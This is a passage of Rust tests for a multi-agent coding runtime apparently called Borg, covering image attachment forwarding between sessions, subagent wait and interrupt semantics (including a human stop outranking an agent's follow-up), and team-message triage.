    // attachment preflight accepts as proof of a shared blob store; without
    // it these sessions are merely two rows that nothing places on this
    // machine.
    let host_id = Uuid::new_v4();
    for session in [sender, recipient] {
        let binding = store.workspace_binding(session).await.unwrap().unwrap();
        store
            .attach_workspace(crate::SessionWorkspaceBinding {
                host_id: Some(host_id),
                ..binding
            })
            .await
            .unwrap();
    }
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory,
        sender,
        launch(),
        1,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store.clone(),
    )
    .unwrap();
    (coordinator, sender, recipient, store, scratch)
}

/// A participant with no session in this installation is reached through the
/// workspace, not through a process here, so nothing can resolve its image
/// digests. The refusal has to land before the first durable write: this route
/// creates a direct workspace and appends a message, and a message admitted
/// without its pictures is the fake delivery this path exists to prevent.
///
/// The guard must sit AFTER the local-session redirect, though. Participant
/// addressing is the normal way to reach a known peer, and refusing every
/// attachment on sight made same-host forwarding work only through
/// session:<UUID> syntax -- see the sibling test.
#[tokio::test]
async fn forwarding_images_to_a_participant_with_no_local_session_is_refused_before_durable_writes()
{
    let directory = tempdir().unwrap();
    let (coordinator, sender, _recipient, store, scratch) =
        image_routing_fixture(directory.path()).await;
    // Discovered elsewhere: a real participant that was discovered, holding a
    // workspace of its own so it stays off this sender's roster, and with no
    // session here so the local redirect cannot fire. That is what "no local
    // session" means in production. A participant that simply does not exist
    // fails the direct-workspace path for an unrelated reason, which would
    // leave the refusal below untested.
    let elsewhere = Uuid::new_v4();
    store
        .workspace_store()
        .await
        .unwrap()
        .unwrap()
        .ensure_execution_workspace(
            Uuid::new_v4(),
            "elsewhere project",
            crate::local_human_participant_id("Human"),
            "Human",
            elsewhere,
            "Elsewhere root",
        )
        .await
        .unwrap();

    let source = directory.path().join("screenshot.png");
    std::fs::write(&source, sample_png()).unwrap();
    let options = TeamMessageOptions {
        attachments: capture_message_attachments(directory.path(), &[source])
            .await
            .unwrap(),
        ..TeamMessageOptions::default()
    };

    let refusal = coordinator
        .route_workspace_participant_message_as(
            sender,
            elsewhere,
            "here is the failing frame",
            options,
            DeliveryMode::NextTurn,
        )
        .await;
    let error = match refusal {
        Ok(_) => panic!("images to a participant with no local session must be refused"),
        Err(error) => format!("{error:#}"),
    };
    assert!(
        error.contains("no local session here"),
        "refusal should say why, got: {error}"
    );

    // Positive control: the identical message without images still routes,
    // creating the direct workspace the refusal above had to prevent. Without
    // this the assertion could pass on a broken fixture.
    coordinator
        .route_workspace_participant_message_as(
            sender,
            elsewhere,
            "here is the failing frame",
            TeamMessageOptions::default(),
            DeliveryMode::NextTurn,
        )
        .await
        .expect("the same message without images must still route");
    scratch.discard().await;
}

/// The delivery path end to end on the real route: a same-host message must
/// reach the recipient's inbox carrying verified local files, and must still
/// do so on replay after the sender's original is gone. Those paths are what
/// session.rs hands to TeamPrompt, which is what becomes pixels.
#[tokio::test]
async fn a_same_host_message_delivers_verified_image_files_and_replays_without_the_original() {
    let directory = tempdir().unwrap();
    let (coordinator, sender, recipient, _store, scratch) =
        image_routing_fixture(directory.path()).await;

    let source = directory.path().join("frame.png");
    let original = sample_png();
    std::fs::write(&source, &original).unwrap();
    let options = TeamMessageOptions {
        attachments: capture_message_attachments(directory.path(), std::slice::from_ref(&source))
            .await
            .unwrap(),
        ..TeamMessageOptions::default()
    };

    let (inbox, receipt) = coordinator
        .persist_team_message(
            sender,
            recipient,
            "/root",
            "compare this against the baseline",
            crate::contract::PromptDelivery::Queue,
            DeliveryMode::NextTurn,
            options,
        )
        .await
        .expect("a same-host image message must route");
    assert!(receipt.is_some(), "the message should be durable");
    assert_eq!(inbox.attachments.len(), 1);
    assert_eq!(
        std::fs::read(&inbox.attachments[0]).unwrap(),
        original,
        "the recipient must receive the bytes the sender sent"
    );

    // Delete the sender's file: replay must not depend on it.
    std::fs::remove_file(&source).unwrap();
    let unread = coordinator
        .unread_messages_for_session(recipient)
        .await
        .unwrap();
    let replayed = unread
        .iter()
        .find(|message| message.message_id == inbox.message_id)
        .expect("the durable message must replay");
    assert_eq!(
        replayed.attachments.len(),
        1,
        "replay dropped the image instead of resolving it from the store"
    );
    assert_eq!(
        std::fs::read(&replayed.attachments[0]).unwrap(),
        original,
        "replay delivered different bytes than were captured"
    );
    scratch.discard().await;
}

/// Manual probe: prove a forwarded image reaches a recipient model as pixels.
///
/// Generate the image first, so the token exists ONLY in pixels and in the
/// assertion variable -- never in the prompt, the filename, or this source:
///   TOKEN=$(python3 -c "import secrets;print('BORG-VIS-'+secrets.token_hex(4).upper())")
///   python3 -c "
/// from PIL import Image, ImageDraw, ImageFont
/// import os
/// img=Image.new('RGB',(1024,256),'white'); d=ImageDraw.Draw(img)
/// f=ImageFont.truetype('/usr/share/fonts/TTF/JetBrainsMono-ExtraBold.ttf',72)
/// d.text((40,90), os.environ['TOKEN'], fill='black', font=f)
/// img.save('/tmp/borg-vision-probe.png')"
///   BORG_VISION_IMAGE=/tmp/borg-vision-probe.png BORG_VISION_TOKEN="$TOKEN" \
///   cargo test -p borg-agent-runtime --lib -- \
///     forwarded_image_reaches_the_recipient_model_as_pixels --ignored --nocapture
///
/// A random token is the whole point: a model that only infers "a white image
/// with text on it" fails, and nothing in the request tells it what to say.
/// Only reading the pixels produces the token.
///
/// SCOPE: this covers the new send_message capture/persist/resolve path plus a
/// real recipient model turn over the resolved bytes. It does NOT cover
/// session.rs's TeamPrompt-to-Prompt conversion or two-host routing.
///
/// The turn runs on the Claude subscription CLI path, not Borg's native
/// harness: `uses_native_harness` covers only Kimi, Glm, OpenRouter and
/// OpenAiCompatible, so a Claude turn goes through `run_borg_provider_turn`
/// and out to the Claude process. What this proves about image delivery is
/// therefore what that path does, which is also the path a real recipient
/// session uses.
#[tokio::test]
#[ignore]
async fn forwarded_image_reaches_the_recipient_model_as_pixels() {
    // Explicit and actionable: invoking this without the variables must fail
    // loudly rather than pass while proving nothing.
    let source = std::env::var("BORG_VISION_IMAGE").expect(
        "set BORG_VISION_IMAGE=/tmp/borg-vision-probe.png (see this test's doc comment for the \
         generator); running it without a real image would assert nothing",
    );
    let token = std::env::var("BORG_VISION_TOKEN").expect(
        "set BORG_VISION_TOKEN to the token rendered into BORG_VISION_IMAGE; without it this \
         test cannot tell pixels from a plausible guess",
    );
    assert!(
        std::env::var_os("ANTHROPIC_API_KEY").is_none(),
        "refusing to run: ANTHROPIC_API_KEY is set, which would bill the API instead of the \
         authenticated subscription",
    );

    let directory = tempdir().unwrap();
    let (coordinator, sender, recipient, store, scratch) =
        image_routing_fixture(directory.path()).await;

    // The test owns its copy, under a neutral name: the filename must not be
    // able to tell the model what the answer is.
    let owned = directory.path().join("forwarded-evidence.png");
    std::fs::copy(&source, &owned).expect("copy the probe image into the test's own temp path");

    let options = TeamMessageOptions {
        attachments: capture_message_attachments(directory.path(), std::slice::from_ref(&owned))
            .await
            .expect("capture the image through the send_message path"),
        ..TeamMessageOptions::default()
    };
    let digest = options.attachments[0].sha256.clone();

    let (inbox, receipt) = coordinator
        .persist_team_message(
            sender,
            recipient,
            "/root",
            "Attached image forwarded for visual verification.",
            crate::contract::PromptDelivery::Queue,
            DeliveryMode::NextTurn,
            options,
        )
        .await
        .expect("a same-host image message must route");
    assert!(receipt.is_some());
    assert_eq!(inbox.attachments.len(), 1);

    // Force the model to read what the store kept, not the sender's file.
    std::fs::remove_file(&owned).expect("remove the sender's copy");

    let autonomy: Option<std::sync::Arc<dyn crate::autonomy::AutonomyStore>> =
        store.autonomy_store().await.unwrap();
    let turn = crate::AgentTurn {
        session_id: recipient,
        prompt_cache_session_id: None,
        message_id: inbox.message_id,
        context_generation: 0,
        provider: CodingProvider::Claude,
        provider_session_id: None,
        provider_fork_turn_id: None,
        cwd: directory.path().to_path_buf(),
        // The prompt must not name the token, or a model could answer without
        // ever decoding the image.
        prompt_delta: "Reply with only the exact text visible in the attached image.".to_string(),
        prompt: "Reply with only the exact text visible in the attached image. Output that text \
                 and nothing else."
            .to_string(),
        attachments: inbox.attachments.clone(),
        output_schema: None,
        model: Some("claude-opus-5".to_string()),
        effort: None,
        fast: None,
        response_language: crate::ResponseLanguage::Auto,
        permission_mode: PermissionMode::FullAccess,
        conversation: Vec::new(),
        // Deliberately nameless. Claude is not a native-harness provider, so
        // this turn keeps tools enabled and the server is written into the MCP
        // config handed to the Claude CLI -- which would then try to launch
        // whatever command it names. prepare_external_provider_mcp skips an
        // entry with an empty name, so nothing is advertised and nothing is
        // launched on the probe's behalf.
        agent_mcp_server: borg_provider::mcp::ExternalMcpServer::default(),
        agent_tools: AgentToolDispatcher::new(
            SessionGoalTools::disconnected(),
            SessionTodoTools::disconnected(),
            None,
            crate::LspService::new(directory.path()),
            CodingProvider::Claude,
            recipient,
            false,
            None,
            None,
            directory.path().to_path_buf(),
            None,
            autonomy,
            Some(store.clone() as std::sync::Arc<dyn crate::SessionStore>),
            Vec::new(),
            None,
            crate::native_process::ProcessManager::default(),
            PermissionMode::FullAccess,
        ),
        external_mcp_servers: Vec::new(),
        runtime_mcp_context: Default::default(),
        runtime_provider_context: None,
        extension_skill_roots: Vec::new(),
        extension_workflows: Vec::new(),
        extension_api: Default::default(),
        system_prompt_appendix: String::new(),
        declaration_base: None,
        request_prefix_base: None,
        prompt_context_base: Default::default(),
        volatile_system_prompt_appendix: String::new(),
    };

    let (events, mut drain) = mpsc::channel(64);
    let pump = tokio::spawn(async move { while drain.recv().await.is_some() {} });
    let executor = crate::LocalAgentTurnExecutor::default();
    let result = crate::AgentTurnExecutor::execute(&executor, turn, events, None)
        .await
        .expect("one real vision turn");
    pump.abort();

    // Receipt, printed under --nocapture so the run is auditable.
    eprintln!("VISION RECEIPT provider=Claude model=claude-opus-5");
    eprintln!("VISION RECEIPT billing_path=claude_code_session (authenticated subscription)");
    eprintln!("VISION RECEIPT attachment_sha256={digest}");
    eprintln!(
        "VISION RECEIPT provider_session={:?}",
        result.provider_session_id
    );
    eprintln!("VISION RECEIPT literal_response={:?}", result.final_text);

    assert!(
        result.final_text.contains(&token),
        "the recipient model did not report the token rendered in the image; it saw no pixels. \
         literal response: {:?}",
        result.final_text
    );
    scratch.discard().await;
}

/// Records the attachments each turn actually received.
struct AttachmentRecordingExecutor {
    attachments: Arc<StdMutex<Vec<Vec<PathBuf>>>>,
}

#[async_trait::async_trait]
impl crate::AgentTurnExecutor for AttachmentRecordingExecutor {
    async fn execute(
        &self,
        turn: crate::AgentTurn,
        _events: mpsc::Sender<SessionEventKind>,
        _controls: Option<mpsc::Receiver<crate::AgentTurnControl>>,
    ) -> Result<crate::AgentTurnResult> {
        self.attachments
            .lock()
            .expect("attachment lock")
            .push(turn.attachments.clone());
        Ok(crate::AgentTurnResult {
            provider_session_id: None,
            final_text: "noted".to_string(),
        })
    }
}

/// Images must survive all the way into the turn the model is given.
///
/// Delivery to a local subagent goes through send_prompt rather than the
/// control socket, and that path passed an empty attachment list, so a child
/// received the text of a message and none of its pictures -- the message
/// looked delivered and its evidence was silently gone. A real model would
/// have to be asked about an image it never received to notice. This asserts
/// on the turn itself, so the fake executor is enough to catch it.
#[tokio::test]
async fn images_sent_to_a_local_subagent_arrive_in_its_model_turn() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let seen = Arc::new(StdMutex::new(Vec::new()));
    let executor = AttachmentRecordingExecutor {
        attachments: Arc::clone(&seen),
    };
    let mut root_launch = launch();
    root_launch.capabilities.multiplayer = false;
    root_launch.cwd = directory.path().to_path_buf();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        root_launch,
        1,
        Arc::new(executor),
        store,
    )
    .unwrap();

    let spawned = coordinator
        .call_tool(
            "spawn_agent",
            json!({
                "action": "review evidence",
                "task_name": "reviewer",
                "message": "Stand by for evidence."
            }),
        )
        .await
        .unwrap();
    let child = Uuid::parse_str(spawned["session_id"].as_str().unwrap()).unwrap();
    tokio::time::timeout(Duration::from_secs(5), async {
        loop {
            if coordinator.get(child).await.unwrap().status == SubagentStatus::Ready {
                break;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    })
    .await
    .expect("the subagent should become ready");

    let source = directory.path().join("evidence.png");
    let original = sample_png();
    std::fs::write(&source, &original).unwrap();
    let before = seen.lock().expect("attachment lock").len();

    coordinator
        .call_tool(
            "send_message",
            json!({
                "target": "reviewer",
                "message": "Look at the attached frame.",
                "attachments": [source.to_str().unwrap()],
                // An idle child only QUEUES a plain message, so a turn would
                // never start and the assertion below would time out proving
                // nothing. Waking it is what makes the delivery observable.
                "wake": true,
            }),
        )
        .await
        .expect("sending an image to a local subagent must route");

    let delivered = tokio::time::timeout(Duration::from_secs(5), async {
        loop {
            let recorded = seen.lock().expect("attachment lock").clone();
            if let Some(turn) = recorded.get(before)
                && !turn.is_empty()
            {
                return turn.clone();
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    })
    .await
    .expect("the subagent's turn must carry the forwarded image");

    assert_eq!(delivered.len(), 1);
    assert_eq!(
        std::fs::read(&delivered[0]).unwrap(),
        original,
        "the turn carried a file, but not the bytes that were sent"
    );
    scratch.discard().await;
}

/// participant:<id> is the ordinary way to address a discovered peer, and for
/// a peer with a session here it redirects to session routing. A guard placed
/// ahead of that redirect refused images to same-host peers that were
/// perfectly reachable, leaving forwarding working only through session:<UUID>
/// syntax. The images must survive the redirect.
#[tokio::test]
async fn images_reach_a_same_host_peer_through_ordinary_participant_addressing() {
    let directory = tempdir().unwrap();
    let (coordinator, sender, recipient, store, scratch) =
        image_routing_fixture(directory.path()).await;
    let recipient_participant = store
        .workspace_binding(recipient)
        .await
        .unwrap()
        .unwrap()
        .participant_id;

    let source = directory.path().join("frame.png");
    let original = sample_png();
    std::fs::write(&source, &original).unwrap();
    let options = TeamMessageOptions {
        attachments: capture_message_attachments(directory.path(), &[source])
            .await
            .unwrap(),
        ..TeamMessageOptions::default()
    };

    coordinator
        .route_workspace_participant_message_as(
            sender,
            recipient_participant,
            "compare this against the baseline",
            options,
            DeliveryMode::NextTurn,
        )
        .await
        .expect("a same-host peer addressed as a participant must accept images");

    let unread = coordinator
        .unread_messages_for_session(recipient)
        .await
        .unwrap();
    let delivered = unread
        .iter()
        .find(|message| !message.attachments.is_empty())
        .expect("the forwarded image must survive the participant redirect");
    assert_eq!(delivered.attachments.len(), 1);
    assert_eq!(
        std::fs::read(&delivered.attachments[0]).unwrap(),
        original,
        "the peer received a file, but not the bytes that were sent"
    );
    scratch.discard().await;
}

/// Absent host bindings mean "nothing recorded a host", which is not the same
/// as "same host". Treating missing information as local would forward images
/// to a recipient whose store cannot resolve them.
///
/// The sessions are deliberately in DIFFERENT workspaces, so admitting this
/// message would first create a direct workspace and give it members. That is
/// why the refusal has to precede it: the assertion here is not merely that no
/// message arrived, but that no workspace was brought into being for one.
#[tokio::test]
async fn images_are_refused_when_nothing_proves_the_recipient_shares_this_host() {
    let directory = tempdir().unwrap();
    let sender = Uuid::new_v4();
    let recipient = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    let human = crate::local_human_participant_id("Human");
    let workspace = {
        store
            .create_session_in_workspace(sender, Uuid::new_v4())
            .await
            .unwrap();
        store
            .create_session_in_workspace(recipient, Uuid::new_v4())
            .await
            .unwrap();
        store.workspace_store().await.unwrap().unwrap()
    };
    for (session, label) in [(sender, "Sender root"), (recipient, "Recipient root")] {
        let binding = store.workspace_binding(session).await.unwrap().unwrap();
        workspace
            .ensure_execution_workspace(
                binding.workspace_id,
                "separate project",
                human,
                "Human",
                session,
                label,
            )
            .await
            .unwrap();
    }
    // Deliberately no host recorded on either side, and the recipient is
    // neither a child of this coordinator nor a live local owner.
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        sender,
        launch(),
        1,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store.clone(),
    )
    .unwrap();

    let sender_participant = store
        .workspace_binding(sender)
        .await
        .unwrap()
        .unwrap()
        .participant_id;
    let workspaces_before = workspace
        .list_workspaces_for_participant(sender_participant)
        .await
        .unwrap()
        .len();

    let source = directory.path().join("frame.png");
    std::fs::write(&source, sample_png()).unwrap();
    let options = TeamMessageOptions {
        attachments: capture_message_attachments(directory.path(), &[source])
            .await
            .unwrap(),
        ..TeamMessageOptions::default()
    };

    let refusal = coordinator
        .persist_team_message(
            sender,
            recipient,
            "/root",
            "unproven recipient",
            crate::contract::PromptDelivery::Queue,
            DeliveryMode::NextTurn,
            options,
        )
        .await;
    match refusal {
        Ok(_) => panic!("an unproven recipient must not receive images"),
        Err(error) => assert!(
            format!("{error:#}").contains("attachment store"),
            "unexpected error: {error:#}"
        ),
    }
    assert_eq!(
        workspace
            .list_workspaces_for_participant(sender_participant)
            .await
            .unwrap()
            .len(),
        workspaces_before,
        "a refused image message must not leave a direct workspace behind"
    );
    assert!(
        coordinator
            .unread_messages_for_session(recipient)
            .await
            .unwrap()
            .is_empty(),
        "a refused image message must leave no durable receipt"
    );
    scratch.discard().await;
}

/// A message with no images must serialize exactly as it did before the field
/// existed, so adding image forwarding does not rewrite every existing journal
/// row's shape.
#[test]
fn a_message_without_images_serializes_without_an_attachments_field() {
    let body = crate::WorkspaceMessageBody {
        text: "no images here".to_string(),
        mentions: Vec::new(),
        attachments: Vec::new(),
    };
    let encoded = serde_json::to_string(&body).expect("serialize body");
    assert!(
        !encoded.contains("attachments"),
        "an empty attachment list must not be written: {encoded}"
    );
}

/// Failure mode: a child surface drifting from the director surface. Three
/// ways it did: a child kept the parent yield and the consultation tools it
/// must not hold, a child silently lost a tool the director has (the
/// advertised surface was built with search off), and a tool present in both
/// carried a different schema for a child (spawn_agent advertised four
/// providers while the runtime admitted eleven, fixed in 5a38ea2).
#[test]
fn a_child_surface_is_the_director_surface_minus_the_documented_exceptions() {
    // The documented exceptions, by tool name.
    let exceptions = [
        "consult_model",
        "consult_peer",
        "rotate_peer",
        "update_agent_settings",
        "watch",
        "list_watchers",
        "await_watchers",
        "stop_watcher",
    ];
    let names = |surface| {
        agent_tool_specs_for_surface(CodingProvider::Codex, surface, None)
            .into_iter()
            .filter_map(|spec| spec["name"].as_str().map(str::to_owned))
            .collect::<Vec<_>>()
    };
    let normal = names(ToolSurface::director());
    assert!(normal.contains(&"watch".to_string()));
    assert!(!normal.contains(&"await_watchers".to_string()));
    let enabled = names(ToolSurface {
        watcher_yield: true,
        ..ToolSurface::director()
    });
    assert!(enabled.contains(&"await_watchers".to_string()));
    for provider in [
        CodingProvider::Codex,
        CodingProvider::Claude,
        CodingProvider::OpenRouter,
        CodingProvider::OpenAiCompatible,
    ] {
        let director = agent_tool_specs_for_surface(provider, ToolSurface::director(), None);
        let child =
            agent_tool_specs_for_surface(provider, ToolSurface::director().for_child(), None);
        let names = |specs: &[Value]| {
            specs
                .iter()
                .filter_map(|spec| spec["name"].as_str().map(str::to_owned))
                .collect::<Vec<_>>()
        };
        let director_names = names(&director);
        let expected = director_names
            .iter()
            .filter(|name| !exceptions.contains(&name.as_str()))
            .cloned()
            .collect::<Vec<_>>();
        assert_eq!(
            names(&child),
            expected,
            "{provider:?} child surface is not the director surface minus the documented exceptions"
        );
        // computer_use is kept but confined to a private display: only the
        // description and the display enum differ.
        let confined = child
            .iter()
            .find(|spec| spec["name"] == "computer_use")
            .expect("a child keeps private-display computer use");
        assert_eq!(
            confined["inputSchema"]["properties"]["display"]["enum"],
            json!(["private"])
        );
        for name in names(&child) {
            if name == "computer_use" {
                continue;
            }
            let in_director = director
                .iter()
                .find(|spec| spec["name"] == name.as_str())
                .expect("director surface has the tool");
            let in_child = child
                .iter()
                .find(|spec| spec["name"] == name.as_str())
                .expect("child surface has the tool");
            assert_eq!(
                in_director, in_child,
                "{provider:?} advertises {name} with a different schema for a child"
            );
        }
    }
}

async fn waiting_team() -> (
    tempfile::TempDir,
    crate::session_store::postgres::testing::ScratchDatabase,
    SubagentCoordinator,
    Uuid,
    Uuid,
) {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        launch(),
        3,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store.clone(),
    )
    .unwrap();
    let worker = {
        let mut table = coordinator.table.lock().await;
        let worker = table.reserve("worker", &launch()).unwrap();
        table
            .entries
            .get_mut(&worker.session_id)
            .unwrap()
            .snapshot
            .status = SubagentStatus::Running;
        worker.session_id
    };
    bind_test_team(directory.path(), store.as_ref(), root, &[worker]).await;
    (directory, scratch, coordinator, root, worker)
}

/// Apply a child event to the table and publish it, as the child actor does.
async fn child_event(coordinator: &SubagentCoordinator, child: Uuid, kind: SessionEventKind) {
    let event = SessionEvent::new(child, 1, kind);
    update_from_session_event(&coordinator.table, child, &event).await;
    let _ = coordinator
        .activity_tx
        .send(SubagentActivity::SessionEvent {
            parent_session_id: coordinator.root_session_id,
            task_name: "worker".to_string(),
            event,
        });
}

#[tokio::test]
async fn wait_agent_blocks_until_a_child_finishes_and_reports_it_once() {
    let (_directory, scratch, coordinator, root, worker) = waiting_team().await;
    let waiting = {
        let coordinator = coordinator.clone();
        tokio::spawn(async move {
            coordinator
                .wait_for(root, Duration::from_secs(1800), WaitSignals::default())
                .await
        })
    };
    tokio::time::sleep(Duration::from_millis(200)).await;
    assert!(
        !waiting.is_finished(),
        "a working child must not end the wait"
    );
    let finished = Instant::now();
    child_event(
        &coordinator,
        worker,
        SessionEventKind::Message {
            message_id: Uuid::new_v4(),
            actor: crate::EventActor::Assistant,
            text: "done: 3 files fixed".to_string(),
            attachments: Vec::new(),
            status: MessageStatus::Complete,
            delivery: None,
        },
    )
    .await;
    child_event(
        &coordinator,
        worker,
        SessionEventKind::StatusChanged {
            status: SessionStatus::Ready,
            detail: None,
        },
    )
    .await;
    let result = tokio::time::timeout(Duration::from_secs(5), waiting)
        .await
        .expect("a finished child ends the wait promptly")
        .unwrap()
        .unwrap();
    assert!(finished.elapsed() < Duration::from_secs(3));
    assert_eq!(result["reason"], "child_settled");
    assert_eq!(result["changes"][0]["status"], "ready");
    assert_eq!(result["changes"][0]["final_text"], "done: 3 files fixed");
    assert_eq!(result["agents"][0]["task_name"], "/root/worker");

    // The same completion is not news on the next wait: before this fix every
    // later wait returned it immediately and parents fell back to sleeping.
    let again = coordinator
        .wait_for(root, Duration::from_millis(300), WaitSignals::default())
        .await
        .unwrap();
    assert_eq!(again["reason"], "timeout");
    assert_eq!(again["changes"], json!([]));
    scratch.discard().await;
}

#[tokio::test]
async fn wait_agent_returns_on_a_child_report_and_on_waiting_input() {
    let (_directory, scratch, coordinator, root, worker) = waiting_team().await;
    let waiting = {
        let coordinator = coordinator.clone();
        tokio::spawn(async move {
            coordinator
                .wait_for(root, Duration::from_secs(1800), WaitSignals::default())
                .await
        })
    };
    tokio::time::sleep(Duration::from_millis(100)).await;
    coordinator
        .send_message_as(worker, "/root", "blocked on an API decision")
        .await
        .unwrap();
    let result = tokio::time::timeout(Duration::from_secs(5), waiting)
        .await
        .expect("a child report ends the wait promptly")
        .unwrap()
        .unwrap();
    assert_eq!(result["reason"], "child_message");
    assert_eq!(result["messages"][0]["from"], "/root/worker");
    assert_eq!(result["messages"][0]["text"], "blocked on an API decision");
    assert_eq!(result["agents"][0]["status"], "running");
    assert!(
        coordinator
            .unread_messages_for_session(root)
            .await
            .unwrap()
            .is_empty(),
        "a report wait_agent returned is read"
    );

    let (input, input_pending) = tokio::sync::watch::channel(false);
    let waiting = {
        let coordinator = coordinator.clone();
        tokio::spawn(async move {
            coordinator
                .wait_for(
                    root,
                    Duration::from_secs(1800),
                    WaitSignals {
                        cancel: None,
                        input_pending: Some(input_pending),
                    },
                )
                .await
        })
    };
    tokio::time::sleep(Duration::from_millis(100)).await;
    assert!(
        !waiting.is_finished(),
        "a delivered report is not reported twice"
    );
    input.send(true).unwrap();
    let result = tokio::time::timeout(Duration::from_secs(2), waiting)
        .await
        .expect("waiting human input ends the wait")
        .unwrap()
        .unwrap();
    assert_eq!(result["reason"], "input_pending");
    scratch.discard().await;
}

#[tokio::test]
async fn wait_agent_times_out_with_a_status_line_per_child_and_accepts_long_waits() {
    let (_directory, scratch, coordinator, root, _worker) = waiting_team().await;
    let started = Instant::now();
    let result = coordinator
        .wait_for(root, Duration::from_millis(400), WaitSignals::default())
        .await
        .unwrap();
    assert!(started.elapsed() >= Duration::from_millis(400));
    assert_eq!(result["reason"], "timeout");
    assert_eq!(result["agents"][0]["status"], "running");
    assert!(result["agents"][0]["quiet_s"].is_u64());

    let spec = subagent_tool_specs(CodingProvider::Codex)
        .into_iter()
        .find(|tool| tool["name"] == "wait_agent")
        .unwrap();
    let timeout = &spec["inputSchema"]["properties"]["timeout_ms"];
    assert_eq!(timeout["maximum"], 1_800_000);
    let args: WaitAgentArgs = serde_json::from_value(json!({})).unwrap();
    assert_eq!(args.timeout(), Duration::from_secs(600));
    scratch.discard().await;
}

#[tokio::test]
async fn only_the_interrupting_agent_resumes_an_interrupted_child() {
    let (_directory, scratch, coordinator, root, worker) = waiting_team().await;
    let (commands, mut received) = mpsc::channel(8);
    coordinator
        .table
        .lock()
        .await
        .entries
        .get_mut(&worker)
        .unwrap()
        .commands = Some(commands);
    let followup = |message: &'static str| {
        let coordinator = coordinator.clone();
        async move {
            coordinator
                .call_tool_as(
                    root,
                    "followup_task",
                    json!({"target": "worker", "message": message}),
                )
                .await
                .unwrap();
        }
    };

    // A human stop (the UI path) is not released by an agent's follow-up.
    coordinator.interrupt("worker").await.unwrap();
    assert!(matches!(
        received.recv().await,
        Some(HostCommand::Interrupt { .. })
    ));
    followup("keep going").await;
    assert!(matches!(
        received.recv().await,
        Some(HostCommand::TeamPrompt { .. })
    ));

    coordinator
        .call_tool_as(root, "interrupt_agent", json!({"target": "worker"}))
        .await
        .unwrap();
    assert!(matches!(
        received.recv().await,
        Some(HostCommand::Interrupt { .. })
    ));
    // The child's stop report journals this snapshot; it must name the
    // interrupter so a restarted parent can still resume the child.
    assert_eq!(
        coordinator
            .resolve_snapshot("worker")
            .await
            .unwrap()
            .interrupted_by,
        Some(root)
    );
    // A real child records Running ("cancelling") while it winds down.
    child_event(
        &coordinator,
        worker,
        SessionEventKind::StatusChanged {
            status: SessionStatus::Running,
            detail: Some("cancelling".to_string()),
        },
    )
    .await;
    // The interrupt leaves the child idle with its last narration. The parent
    // is about to act on that, so the follow-up's wait must not end on it.
    child_event(
        &coordinator,
        worker,
        SessionEventKind::Message {
            message_id: Uuid::new_v4(),
            actor: crate::EventActor::Assistant,
            text: "Running the full suite now".to_string(),
            attachments: Vec::new(),
            status: MessageStatus::Complete,
            delivery: None,
        },
    )
    .await;
    child_event(
        &coordinator,
        worker,
        SessionEventKind::StatusChanged {
            status: SessionStatus::Ready,
            detail: Some("Interrupted".to_string()),
        },
    )
    .await;
    assert!(matches!(
        received.recv().await,
        Some(HostCommand::ReleaseRetainedContext { .. })
    ));
    followup("resume with the smaller fix").await;
    let waited = coordinator
        .wait_for(root, Duration::from_millis(300), WaitSignals::default())
        .await
        .unwrap();
    assert_eq!(waited["changes"], json!([]), "{waited}");
    assert!(matches!(
        received.recv().await,
        Some(HostCommand::ResumeFromInterrupt { session_id }) if session_id == worker
    ));
    assert!(matches!(
        received.recv().await,
        Some(HostCommand::TeamPrompt { text, .. }) if text.contains("the stop is lifted")
    ));
    followup("one more thing").await;
    assert!(matches!(
        received.recv().await,
        Some(HostCommand::TeamPrompt { .. })
    ));
    assert!(received.try_recv().is_err());
    scratch.discard().await;
}

/// Failure mode: the parent interrupts a child, the human then stops it too,
/// and the parent's next follow-up lifts the human's stop.
#[tokio::test]
async fn a_human_stop_after_an_agent_interrupt_still_holds() {
    let (_directory, scratch, coordinator, root, worker) = waiting_team().await;
    let (commands, mut received) = mpsc::channel(8);
    coordinator
        .table
        .lock()
        .await
        .entries
        .get_mut(&worker)
        .unwrap()
        .commands = Some(commands);
    coordinator
        .call_tool_as(root, "interrupt_agent", json!({"target": "worker"}))
        .await
        .unwrap();
    assert!(matches!(
        received.recv().await,
        Some(HostCommand::Interrupt { .. })
    ));
    coordinator.interrupt("worker").await.unwrap();
    assert!(matches!(
        received.recv().await,
        Some(HostCommand::Interrupt { .. })
    ));
    coordinator
        .call_tool_as(
            root,
            "followup_task",
            json!({"target": "worker", "message": "keep going"}),
        )
        .await
        .unwrap();
    assert!(matches!(
        received.recv().await,
        Some(HostCommand::TeamPrompt { text, .. }) if !text.contains("the stop is lifted")
    ));
    assert!(received.try_recv().is_err());
    scratch.discard().await;
}

#[tokio::test]
async fn team_messages_can_be_triaged_and_acknowledged_in_batches() {
    let (_directory, scratch, coordinator, root, worker) = waiting_team().await;
    for text in ["first\nwith detail", "second", "third", "fourth"] {
        coordinator
            .send_message_as(worker, "/root", text)
            .await
            .unwrap();
    }
    let unread = |args: Value| {
        let coordinator = coordinator.clone();
        async move {
            coordinator
                .call_tool_as(root, "list_unread_team_messages", args)
                .await
                .unwrap()
        }
    };
    let ack = |args: Value| {
        let coordinator = coordinator.clone();
        async move {
            coordinator
                .call_tool_as(root, "acknowledge_team_message", args)
                .await
                .unwrap()
        }
    };

    let compact = unread(json!({"compact": true})).await;
    let ids = compact
        .as_array()
        .unwrap()
        .iter()
        .map(|message| message["message_id"].clone())
        .collect::<Vec<_>>();
    assert_eq!(ids.len(), 4);
    assert_eq!(compact[0]["from"], "/root/worker");
    assert_eq!(compact[0]["first_line"], "first…");
